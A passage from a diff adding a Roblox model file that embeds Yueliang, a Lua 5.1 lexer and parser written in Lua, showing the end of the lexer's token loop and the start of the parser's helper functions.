+  Token.seminfo = string.sub(ls.buff, 2, -2)
+end
+
+------------------------------------------------------------------------
+-- main lexer function
+------------------------------------------------------------------------
+function luaX:llex(ls, Token)
+  ls.buff = ""
+  while true do
+    local c = ls.current
+    ----------------------------------------------------------------
+    if self:currIsNewline(ls) then
+      self:inclinenumber(ls)
+    ----------------------------------------------------------------
+    elseif c == "-" then
+      c = self:nextc(ls)
+      if c ~= "-" then return "-" end
+      -- else is a comment
+      local sep = -1
+      if self:nextc(ls) == '[' then
+        sep = self:skip_sep(ls)
+        ls.buff = ""  -- 'skip_sep' may dirty the buffer
+      end
+      if sep >= 0 then
+        self:read_long_string(ls, nil, sep)  -- long comment
+        ls.buff = ""
+      else  -- else short comment
+        while not self:currIsNewline(ls) and ls.current ~= "EOZ" do
+          self:nextc(ls)
+        end
+      end
+    ----------------------------------------------------------------
+    elseif c == "[" then
+      local sep = self:skip_sep(ls)
+      if sep >= 0 then
+        self:read_long_string(ls, Token, sep)
+        return "TK_STRING"
+      elseif sep == -1 then
+        return "["
+      else
+        self:lexerror(ls, "invalid long string delimiter", "TK_STRING")
+      end
+    ----------------------------------------------------------------
+    elseif c == "=" then
+      c = self:nextc(ls)
+      if c ~= "=" then return "="
+      else self:nextc(ls); return "TK_EQ" end
+    ----------------------------------------------------------------
+    elseif c == "<" then
+      c = self:nextc(ls)
+      if c ~= "=" then return "<"
+      else self:nextc(ls); return "TK_LE" end
+    ----------------------------------------------------------------
+    elseif c == ">" then
+      c = self:nextc(ls)
+      if c ~= "=" then return ">"
+      else self:nextc(ls); return "TK_GE" end
+    ----------------------------------------------------------------
+    elseif c == "~" then
+      c = self:nextc(ls)
+      if c ~= "=" then return "~"
+      else self:nextc(ls); return "TK_NE" end
+    ----------------------------------------------------------------
+    elseif c == "\"" or c == "'" then
+      self:read_string(ls, c, Token)
+      return "TK_STRING"
+    ----------------------------------------------------------------
+    elseif c == "." then
+      c = self:save_and_next(ls)
+      if self:check_next(ls, ".") then
+        if self:check_next(ls, ".") then
+          return "TK_DOTS"   -- ...
+        else return "TK_CONCAT"   -- ..
+        end
+      elseif not string.find(c, "%d") then
+        return "."
+      else
+        self:read_numeral(ls, Token)
+        return "TK_NUMBER"
+      end
+    ----------------------------------------------------------------
+    elseif c == "EOZ" then
+      return "TK_EOS"
+    ----------------------------------------------------------------
+    else  -- default
+      if string.find(c, "%s") then
+        -- lua_assert(self:currIsNewline(ls))
+        self:nextc(ls)
+      elseif string.find(c, "%d") then
+        self:read_numeral(ls, Token)
+        return "TK_NUMBER"
+      elseif string.find(c, "[_%a]") then
+        -- identifier or reserved word
+        repeat
+          c = self:save_and_next(ls)
+        until c == "EOZ" or not string.find(c, "[_%w]")
+        local ts = ls.buff
+        local tok = self.enums[ts]
+        if tok then return tok end  -- reserved word?
+        Token.seminfo = ts
+        return "TK_NAME"
+      else
+        self:nextc(ls)
+        return c  -- single-char tokens (+ - / ...)
+      end
+    ----------------------------------------------------------------
+    end--if c
+  end--while
+end
+
+return luaX]]></ProtectedString>
+                                                        <BinaryString name="Tags"></BinaryString>
+                                                </Properties>
+                                        </Item>
+                                        <Item class="ModuleScript" referent="RBX097B2A5EC3F2440FB2F46D22C6642377">
+                                                <Properties>
+                                                        <BinaryString name="AttributesSerialize"></BinaryString>
+                                                        <Content name="LinkedSource"><null></null></Content>
+                                                        <string name="Name">LuaY</string>
+                                                        <string name="ScriptGuid">{D6D09192-A9D4-46CA-94C4-8D13529FF917}</string>
+                                                        <ProtectedString name="Source"><![CDATA[--[[--------------------------------------------------------------------
+
+  lparser.lua
+  Lua 5 parser in Lua
+  This file is part of Yueliang.
+
+  Copyright (c) 2005-2007 Kein-Hong Man <khman@users.sf.net>
+  The COPYRIGHT file describes the conditions
+  under which this software may be distributed.
+
+  See the ChangeLog for more information.
+
+----------------------------------------------------------------------]]
+
+--[[--------------------------------------------------------------------
+-- Notes:
+-- * some unused C code that were not converted are kept as comments
+-- * LUA_COMPAT_VARARG option changed into a comment block
+-- * for value/size specific code added, look for 'NOTE: '
+--
+-- Not implemented:
+-- * luaX_newstring not needed by this Lua implementation
+-- * luaG_checkcode() in assert is not currently implemented
+--
+-- Added:
+-- * some constants added from various header files
+-- * luaY.LUA_QS used in error_expected, check_match (from luaconf.h)
+-- * luaY:LUA_QL needed for error messages (from luaconf.h)
+-- * luaY:growvector (from lmem.h) -- skeleton only, limit checking
+-- * luaY.SHRT_MAX (from <limits.h>) for registerlocalvar
+-- * luaY:newproto (from lfunc.c)
+-- * luaY:int2fb (from lobject.c)
+-- * NOTE: HASARG_MASK, for implementing a VARARG_HASARG bit operation
+-- * NOTE: value-specific code for VARARG_NEEDSARG to replace a bitop
+--
+-- Changed in 5.1.x:
+-- * various code changes are not detailed...
+-- * names of constants may have changed, e.g. added a LUAI_ prefix
+-- * struct expkind: added VKNUM, VVARARG; VCALL's info changed?
+-- * struct expdesc: added nval
+-- * struct FuncState: upvalues data type changed to upvaldesc
+-- * macro hasmultret is new
+-- * function checklimit moved to parser from lexer
+-- * functions anchor_token, errorlimit, checknext are new
+-- * checknext is new, equivalent to 5.0.x's check, see check too
+-- * luaY:next and luaY:lookahead moved to lexer
+-- * break keyword no longer skipped in luaY:breakstat
+-- * function new_localvarstr replaced by new_localvarliteral
+-- * registerlocalvar limits local variables to SHRT_MAX
+-- * create_local deleted, new_localvarliteral used instead
+-- * constant LUAI_MAXUPVALUES increased to 60
+-- * constants MAXPARAMS, LUA_MAXPARSERLEVEL, MAXSTACK removed
+-- * function interface changed: singlevaraux, singlevar
+-- * enterlevel and leavelevel uses nCcalls to track call depth
+-- * added a name argument to main entry function, luaY:parser
+-- * function luaY_index changed to yindex
+-- * luaY:int2fb()'s table size encoding format has been changed
+-- * luaY:log2() no longer needed for table constructors
+-- * function code_params deleted, functionality folded in parlist
+-- * vararg flags handling (is_vararg) changes; also see VARARG_*
+-- * LUA_COMPATUPSYNTAX section for old-style upvalues removed
+-- * repeatstat() calls chunk() instead of block()
+-- * function interface changed: cond, test_then_block
+-- * while statement implementation considerably simplified; MAXEXPWHILE
+--   and EXTRAEXP no longer required, no limits to the complexity of a
+--   while condition
+-- * repeat, forbody statement implementation has major changes,
+--   mostly due to new scoping behaviour of local variables
+-- * OPR_MULT renamed to OPR_MUL
+----------------------------------------------------------------------]]
+
+--requires luaP, luaX, luaK
+local luaY = {}
+local luaX = require(script.Parent.LuaX)
+local luaK = require(script.Parent.LuaK)(luaY)
+local luaP = require(script.Parent.LuaP)
+
+--[[--------------------------------------------------------------------
+-- Expression descriptor
+-- * expkind changed to string constants; luaY:assignment was the only
+--   function to use a relational operator with this enumeration
+-- VVOID       -- no value
+-- VNIL        -- no value
+-- VTRUE       -- no value
+-- VFALSE      -- no value
+-- VK          -- info = index of constant in 'k'
+-- VKNUM       -- nval = numerical value
+-- VLOCAL      -- info = local register
+-- VUPVAL,     -- info = index of upvalue in 'upvalues'
+-- VGLOBAL     -- info = index of table; aux = index of global name in 'k'
+-- VINDEXED    -- info = table register; aux = index register (or 'k')
+-- VJMP        -- info = instruction pc
+-- VRELOCABLE  -- info = instruction pc
+-- VNONRELOC   -- info = result register
+-- VCALL       -- info = instruction pc
+-- VVARARG     -- info = instruction pc
+} ----------------------------------------------------------------------]]
+
+--[[--------------------------------------------------------------------
+-- * expdesc in Lua 5.1.x has a union u and another struct s; this Lua
+--   implementation ignores all instances of u and s usage
+-- struct expdesc:
+--   k  -- (enum: expkind)
+--   info, aux -- (int, int)
+--   nval -- (lua_Number)
+--   t  -- patch list of 'exit when true'
+--   f  -- patch list of 'exit when false'
+----------------------------------------------------------------------]]
+
+--[[--------------------------------------------------------------------
+-- struct upvaldesc:
+--   k  -- (lu_byte)
+--   info -- (lu_byte)
+----------------------------------------------------------------------]]
+
+--[[--------------------------------------------------------------------
+-- state needed to generate code for a given function
+-- struct FuncState:
+--   f  -- current function header (table: Proto)
+--   h  -- table to find (and reuse) elements in 'k' (table: Table)
+--   prev  -- enclosing function (table: FuncState)
+--   ls  -- lexical state (table: LexState)
+--   L  -- copy of the Lua state (table: lua_State)
+--   bl  -- chain of current blocks (table: BlockCnt)
+--   pc  -- next position to code (equivalent to 'ncode')
+--   lasttarget   -- 'pc' of last 'jump target'
+--   jpc  -- list of pending jumps to 'pc'
+--   freereg  -- first free register
+--   nk  -- number of elements in 'k'
+--   np  -- number of elements in 'p'
+--   nlocvars  -- number of elements in 'locvars'
+--   nactvar  -- number of active local variables
+--   upvalues[LUAI_MAXUPVALUES]  -- upvalues (table: upvaldesc)
+--   actvar[LUAI_MAXVARS]  -- declared-variable stack
+----------------------------------------------------------------------]]
+
+------------------------------------------------------------------------
+-- constants used by parser
+-- * picks up duplicate values from luaX if required
+------------------------------------------------------------------------
+
+luaY.LUA_QS = luaX.LUA_QS or "'%s'"  -- (from luaconf.h)
+
+luaY.SHRT_MAX = 32767 -- (from <limits.h>)
+luaY.LUAI_MAXVARS = 200  -- (luaconf.h)
+luaY.LUAI_MAXUPVALUES = 60  -- (luaconf.h)
+luaY.MAX_INT = luaX.MAX_INT or 2147483645  -- (from llimits.h)
+  -- * INT_MAX-2 for 32-bit systems
+luaY.LUAI_MAXCCALLS = 200  -- (from luaconf.h)
+
+luaY.VARARG_HASARG = 1  -- (from lobject.h)
+-- NOTE: HASARG_MASK is value-specific
+luaY.HASARG_MASK = 2 -- this was added for a bitop in parlist()
+luaY.VARARG_ISVARARG = 2
+-- NOTE: there is some value-specific code that involves VARARG_NEEDSARG
+luaY.VARARG_NEEDSARG = 4
+
+luaY.LUA_MULTRET = -1  -- (lua.h)
+
+--[[--------------------------------------------------------------------
+-- other functions
+----------------------------------------------------------------------]]
+
+------------------------------------------------------------------------
+-- LUA_QL describes how error messages quote program elements.
+-- CHANGE it if you want a different appearance. (from luaconf.h)
+------------------------------------------------------------------------
+function luaY:LUA_QL(x)
+  return "'"..x.."'"
+end
+
+------------------------------------------------------------------------
+-- this is a stripped-down luaM_growvector (from lmem.h) which is a
+-- macro based on luaM_growaux (in lmem.c); all the following does is
+-- reproduce the size limit checking logic of the original function
+-- so that error behaviour is identical; all arguments preserved for
+-- convenience, even those which are unused
+-- * set the t field to nil, since this originally does a sizeof(t)
+-- * size (originally a pointer) is never updated, their final values
+--   are set by luaY:close_func(), so overall things should still work
+------------------------------------------------------------------------
+function luaY:growvector(L, v, nelems, size, t, limit, e)
+  if nelems >= limit then
+    error(e)  -- was luaG_runerror
+  end
+end
+
+------------------------------------------------------------------------
+-- initialize a new function prototype structure (from lfunc.c)
+-- * used only in open_func()
+------------------------------------------------------------------------
+function luaY:newproto(L)
+  local f = {} -- Proto
+  -- luaC_link(L, obj2gco(f), LUA_TPROTO); /* GC */
+  f.k = {}
+  f.sizek = 0
+  f.p = {}
+  f.sizep = 0
+  f.code = {}
+  f.sizecode = 0
+  f.sizelineinfo = 0
+  f.sizeupvalues = 0
+  f.nups = 0
+  f.upvalues = {}
+  f.numparams = 0
+  f.is_vararg = 0
+  f.maxstacksize = 0
+  f.lineinfo = {}
+  f.sizelocvars = 0
+  f.locvars = {}
+  f.lineDefined = 0
+  f.lastlinedefined = 0
+  f.source = nil
+  return f
+end
+
+------------------------------------------------------------------------
+-- converts an integer to a "floating point byte", represented as
+-- (eeeeexxx), where the real value is (1xxx) * 2^(eeeee - 1) if
+-- eeeee != 0 and (xxx) otherwise.
+------------------------------------------------------------------------
+function luaY:int2fb(x)
+  local e = 0  -- exponent
+  while x >= 16 do
+    x = math.floor((x + 1) / 2)
+    e = e + 1
+  end
+  if x < 8 then
+    return x
+  else
+    return ((e + 1) * 8) + (x - 8)
+  end
+end
+
+--[[--------------------------------------------------------------------
+-- parser functions
+----------------------------------------------------------------------]]
+
+------------------------------------------------------------------------
+-- true of the kind of expression produces multiple return values
+------------------------------------------------------------------------
+function luaY:hasmultret(k)
+  return k == "VCALL" or k == "VVARARG"
+end
+
+------------------------------------------------------------------------
+-- convenience function to access active local i, returns entry
+------------------------------------------------------------------------
+function luaY:getlocvar(fs, i)
+  return fs.f.locvars[ fs.actvar[i] ]
+end
+
+------------------------------------------------------------------------
+-- check a limit, string m provided as an error message
+------------------------------------------------------------------------
+function luaY:checklimit(fs, v, l, m)
+  if v > l then self:errorlimit(fs, l, m) end
+end
+
+--[[--------------------------------------------------------------------
+-- nodes for block list (list of active blocks)
+-- struct BlockCnt:
+--   previous  -- chain (table: BlockCnt)
+--   breaklist  -- list of jumps out of this loop
+--   nactvar  -- # active local variables outside the breakable structure
+--   upval  -- true if some variable in the block is an upvalue (boolean)
+--   isbreakable  -- true if 'block' is a loop (boolean)
+----------------------------------------------------------------------]]
+
+------------------------------------------------------------------------
+-- prototypes for recursive non-terminal functions
+------------------------------------------------------------------------
+-- prototypes deleted; not required in Lua
+
+------------------------------------------------------------------------
+-- reanchor if last token is has a constant string, see close_func()
+-- * used only in close_func()
+------------------------------------------------------------------------
+function luaY:anchor_token(ls)
+  if ls.t.token == "TK_NAME" or ls.t.token == "TK_STRING" then
+    -- not relevant to Lua implementation of parser
+    -- local ts = ls.t.seminfo
+    -- luaX_newstring(ls, getstr(ts), ts->tsv.len); /* C */
+  end
+end
+
+------------------------------------------------------------------------
+-- throws a syntax error if token expected is not there
+------------------------------------------------------------------------
+function luaY:error_expected(ls, token)
+  luaX:syntaxerror(ls,
+    string.format(self.LUA_QS.." expected", luaX:token2str(ls, token)))
+end
+
+------------------------------------------------------------------------
+-- prepares error message for display, for limits exceeded
+-- * used only in checklimit()
+------------------------------------------------------------------------
+function luaY:errorlimit(fs, limit, what)
+  local msg = (fs.f.linedefined == 0) and
+    string.format("main function has more than %d %s", limit, what) or
+    string.format("function at line %d has more than %d %s",
+                  fs.f.linedefined, limit, what)
+  luaX:lexerror(fs.ls, msg, 0)
+end
+
+------------------------------------------------------------------------
+-- tests for a token, returns outcome
+-- * return value changed to boolean
+------------------------------------------------------------------------
+function luaY:testnext(ls, c)
+  if ls.t.token == c then
+    luaX:next(ls)
+    return true
+  else
+    return false
+  end
+end
+
+------------------------------------------------------------------------
+-- check for existence of a token, throws error if not found
+------------------------------------------------------------------------
+function luaY:check(ls, c)
+  if ls.t.token ~= c then
+    self:error_expected(ls, c)
+  end
+end
+
+------------------------------------------------------------------------
+-- verify existence of a token, then skip it
+------------------------------------------------------------------------
+function luaY:checknext(ls, c)
+  self:check(ls, c)
+  luaX:next(ls)
+end
+
+------------------------------------------------------------------------
+-- throws error if condition not matched
+------------------------------------------------------------------------
+function luaY:check_condition(ls, c, msg)
+  if not c then luaX:syntaxerror(ls, msg) end
+end
+
+------------------------------------------------------------------------
+-- verifies token conditions are met or else throw error
+------------------------------------------------------------------------
+function luaY:check_match(ls, what, who, where)
+  if not self:testnext(ls, what) then
+    if where == ls.linenumber then
+      self:error_expected(ls, what)
+    else
+      luaX:syntaxerror(ls, string.format(
+        self.LUA_QS.." expected (to close "..self.LUA_QS.." at line %d)",
+        luaX:token2str(ls, what), luaX:token2str(ls, who), where))
+    end
+  end
+end
+
+------------------------------------------------------------------------
+-- expect that token is a name, return the name
+------------------------------------------------------------------------
+function luaY:str_checkname(ls)
+  self:check(ls, "TK_NAME")
+  local ts = ls.t.seminfo
+  luaX:next(ls)
+  return ts
+end
+
+------------------------------------------------------------------------
+-- initialize a struct expdesc, expression description data structure
+------------------------------------------------------------------------
+function luaY:init_exp(e, k, i)
+  e.f, e.t = luaK.NO_JUMP, luaK.NO_JUMP
+  e.k = k
+  e.info = i
+end
+
+------------------------------------------------------------------------
+-- adds given string s in string pool, sets e as VK
+------------------------------------------------------------------------
+function luaY:codestring(ls, e, s)
+  self:init_exp(e, "VK", luaK:stringK(ls.fs, s))
+end
+
+------------------------------------------------------------------------
+-- consume a name token, adds it to string pool, sets e as VK
+------------------------------------------------------------------------
+function luaY:checkname(ls, e)
+  self:codestring(ls, e, self:str_checkname(ls))
+end
+
+------------------------------------------------------------------------
+-- creates struct entry for a local variable
+-- * used only in new_localvar()
+------------------------------------------------------------------------
+function luaY:registerlocalvar(ls, varname)
+  local fs = ls.fs
+  local f = fs.f
+  self:growvector(ls.L, f.locvars, fs.nlocvars, f.sizelocvars,
+                  nil, self.SHRT_MAX, "too many local variables")
+  -- loop to initialize empty f.locvar positions not required
+  f.locvars[fs.nlocvars] = {} -- LocVar
+  f.locvars[fs.nlocvars].varname = varname
+  -- luaC_objbarrier(ls.L, f, varname) /* GC */
+  local nlocvars = fs.nlocvars
+  fs.nlocvars = fs.nlocvars + 1
+  return nlocvars
+end
+
+------------------------------------------------------------------------
+-- creates a new local variable given a name and an offset from nactvar
+-- * used in fornum(), forlist(), parlist(), body()
+------------------------------------------------------------------------
+function luaY:new_localvarliteral(ls, v, n)
+  self:new_localvar(ls, v, n)
+end
+
+------------------------------------------------------------------------
+-- register a local variable, set in active variable list
+------------------------------------------------------------------------
+function luaY:new_localvar(ls, name, n)
+  local fs = ls.fs
+  self:checklimit(fs, fs.nactvar + n + 1, self.LUAI_MAXVARS, "local variables")
+  fs.actvar[fs.nactvar + n] = self:registerlocalvar(ls, name)
+end
+
+------------------------------------------------------------------------
+-- adds nvars number of new local variables, set debug information
+------------------------------------------------------------------------
+function luaY:adjustlocalvars(ls, nvars)
+  local fs = ls.fs
+  fs.nactvar = fs.nactvar + nvars
+  for i = nvars, 1, -1 do
+    self:getlocvar(fs, fs.nactvar - i).startpc = fs.pc
+  end
+end
+
+------------------------------------------------------------------------
+-- removes a number of locals, set debug information
+------------------------------------------------------------------------
+function luaY:removevars(ls, tolevel)
+  local fs = ls.fs
+  while fs.nactvar > tolevel do
+    fs.nactvar = fs.nactvar - 1
+    self:getlocvar(fs, fs.nactvar).endpc = fs.pc
+  end
+end
+
+------------------------------------------------------------------------
+-- returns an existing upvalue index based on the given name, or
+-- creates a new upvalue struct entry and returns the new index
+-- * used only in singlevaraux()
+------------------------------------------------------------------------
+function luaY:indexupvalue(fs, name, v)
+  local f = fs.f
+  for i = 0, f.nups - 1 do
+    if fs.upvalues[i].k == v.k and fs.upvalues[i].info == v.info then
+      assert(f.upvalues[i] == name)
+      return i
+    end
+  end
+  -- new one
+  self:checklimit(fs, f.nups + 1, self.LUAI_MAXUPVALUES, "upvalues")
+  self:growvector(fs.L, f.upvalues, f.nups, f.sizeupvalues,
+                  nil, self.MAX_INT, "")
+  -- loop to initialize empty f.upvalues positions not required
+  f.upvalues[f.nups] = name
+  -- luaC_objbarrier(fs->L, f, name); /* GC */
+  assert(v.k == "VLOCAL" or v.k == "VUPVAL")
+  -- this is a partial copy; only k & info fields used
+  fs.upvalues[f.nups] = { k = v.k, info = v.info }
+  local nups = f.nups
+  f.nups = f.nups + 1
+  return nups
+end
+
+------------------------------------------------------------------------
+-- search the local variable namespace of the given fs for a match
+-- * used only in singlevaraux()
+------------------------------------------------------------------------
+function luaY:searchvar(fs, n)
+  for i = fs.nactvar - 1, 0, -1 do
+    if n == self:getlocvar(fs, i).varname then
+      return i
+    end
+  end
+  return -1  -- not found
+end
+
+------------------------------------------------------------------------
+-- * mark upvalue flags in function states up to a given level
+-- * used only in singlevaraux()
+------------------------------------------------------------------------
+function luaY:markupval(fs, level)
+  local bl = fs.bl
+  while bl and bl.nactvar > level do bl = bl.previous end
+  if bl then bl.upval = true end
+end
+
+------------------------------------------------------------------------
+-- handle locals, globals and upvalues and related processing
+-- * search mechanism is recursive, calls itself to search parents
+-- * used only in singlevar()
+------------------------------------------------------------------------
+function luaY:singlevaraux(fs, n, var, base)
+  if fs == nil then  -- no more levels?
+    self:init_exp(var, "VGLOBAL", luaP.NO_REG)  -- default is global variable
+    return "VGLOBAL"
+  else
+    local v = self:searchvar(fs, n)  -- look up at current level
+    if v >= 0 then
+      self:init_exp(var, "VLOCAL", v)
+      if base == 0 then
+        self:markupval(fs, v)  -- local will be used as an upval
+      end
+      return "VLOCAL"
+    else  -- not found at current level; try upper one
+      if self:singlevaraux(fs.prev, n, var, 0) == "VGLOBAL" then
+        return "VGLOBAL"
+      end
+      var.info = self:indexupvalue(fs, n, var)  -- else was LOCAL or UPVAL
+      var.k = "VUPVAL"  -- upvalue in this level
+      return "VUPVAL"
+    end--if v
+  end--if fs
+end
+
+------------------------------------------------------------------------
+-- consume a name token, creates a variable (global|local|upvalue)
+-- * used in prefixexp(), funcname()
+------------------------------------------------------------------------
+function luaY:singlevar(ls, var)
+  local varname = self:str_checkname(ls)
+  local fs = ls.fs
+  if self:singlevaraux(fs, varname, var, 1) == "VGLOBAL" then
+    var.info = luaK:stringK(fs, varname)  -- info points to global name
+  end
+end
+
+------------------------------------------------------------------------
+-- adjust RHS to match LHS in an assignment
+-- * used in assignment(), forlist(), localstat()
+------------------------------------------------------------------------
+function luaY:adjust_assign(ls, nvars, nexps, e)
+  local fs = ls.fs
+  local extra = nvars - nexps
+  if self:hasmultret(e.k) then
+    extra = extra + 1  -- includes call itself
+    if extra <= 0 then extra = 0 end
+    luaK:setreturns(fs, e, extra)  -- last exp. provides the difference
+    if extra > 1 then luaK:reserveregs(fs, extra - 1) end
+  else
+    if e.k ~= "VVOID" then luaK:exp2nextreg(fs, e) end  -- close last expression
+    if extra > 0 then
+      local reg = fs.freereg
+      luaK:reserveregs(fs, extra)
+      luaK:_nil(fs, reg, extra)
+    end
+  end
+end
+
+------------------------------------------------------------------------
+-- tracks and limits parsing depth, assert check at end of parsing
+------------------------------------------------------------------------
+function luaY:enterlevel(ls)
+  ls.L.nCcalls = ls.L.nCcalls + 1
+  if ls.L.nCcalls > self.LUAI_MAXCCALLS then
+    luaX:lexerror(ls, "chunk has too many syntax levels", 0)
+  end
+end
+
+------------------------------------------------------------------------
+-- tracks parsing depth, a pair with luaY:enterlevel()
+------------------------------------------------------------------------
+function luaY:leavelevel(ls)
+  ls.L.nCcalls = ls.L.nCcalls - 1
+end
+
+------------------------------------------------------------------------
+-- enters a code unit, initializes elements
+------------------------------------------------------------------------
+function luaY:enterblock(fs, bl, isbreakable)
+  bl.breaklist = luaK.NO_JUMP
+  bl.isbreakable = isbreakable
+  bl.nactvar = fs.nactvar
+  bl.upval = false
+  bl.previous = fs.bl
+  fs.bl = bl
+  assert(fs.freereg == fs.nactvar)
+end
+
+------------------------------------------------------------------------
+-- leaves a code unit, close any upvalues
+--------
